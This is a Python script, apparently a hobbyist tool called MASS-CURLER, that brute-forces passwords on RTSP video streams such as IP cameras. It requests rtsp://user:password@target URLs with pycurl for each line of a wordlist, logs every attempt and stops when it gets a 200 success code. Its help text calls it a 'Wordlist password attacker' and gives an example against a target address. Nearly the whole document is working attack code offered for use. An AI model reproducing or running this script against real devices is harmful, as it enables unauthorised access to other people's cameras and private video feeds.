#!/usr/bin/env python3

###### MASS-CURLER by otwwarrior@protonmail.com ######
## program will auto stop if response code 200 is received.
## a log file with the name 'massrtsp_<somehash>_log.txt' will be created with each run

import sys
import string
import random

import pycurl
try:
    from io import BytesIO
except ImportError:
    from StringIO import StringIO as BytesIO

from termcolor import colored

# help window
if(sys.argv[1] == '-h'):
  print('Wordlist password attacker on RTSP protocol. Program will auto stop if response code 200 (success) is received. Code 401 means invalid credentials')
  print("a log file with the name 'massrtsp_<somehash>_log.txt' will be created with each run");
  print('usage: python3 massrtsp.py <username> <wordlist> <line of wordlist to start on (0 is first line)> <target:port>')
  print(colored('example:  python3 massrtsp.py admin /path/to/Top_1m_Passwords.txt 0 123.456.7.8:554', 'blue'))
  print("TIP: If you recieve an error in the middle of a run, then chances are the current line of your word list has characters which are not allowed in the RTSP url syntax. To resume, take note of which line the program left off at, and re run with line number after the line that caused the error")
  exit()

# define args
username = sys.argv[1]
wordlist = sys.argv[2]
startline = int(sys.argv[3])
target = sys.argv[4]

# Using readlines()
file1 = open(wordlist, 'r')
Lines = file1.readlines()

# create log file with hash title
fileid = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
filename = 'massrtsp_{}_log.txt'.format(fileid)

start = startline
# Strips the newline character
for line in Lines[start:] :   
    tempURL =  "rtsp://{}:{}@{}".format(username, line.strip(), target)
    print(colored(tempURL, 'blue'))
    
    buffer = BytesIO()
    c = pycurl.Curl()
    c.setopt(c.URL, tempURL)
    c.setopt(c.WRITEDATA, buffer)
    c.perform()
    
    f = open(filename, "a")
    f.write("line num: {} | Password: {} | Status: {} | Time: {} \n".format(start, line, c.getinfo(c.RESPONSE_CODE), c.getinfo(c.TOTAL_TIME)))

    print('line num: ', start,'Status: %d' % c.getinfo(c.RESPONSE_CODE), 'Time: %f' % c.getinfo(c.TOTAL_TIME))

    # HTTP response code, e.g. 200.
    if(c.getinfo(c.RESPONSE_CODE) == 401):
        print('passwd:',line,' ','failed',':','response code: ',c.getinfo(c.RESPONSE_CODE))
    if(c.getinfo(c.RESPONSE_CODE) == 200):
        print('passwd:',line,' ','success',':','response code: ',c.getinfo(c.RESPONSE_CODE))
        c.close()
        f.close()
        break
    
    start = start+1
    c.close()
    f.close()
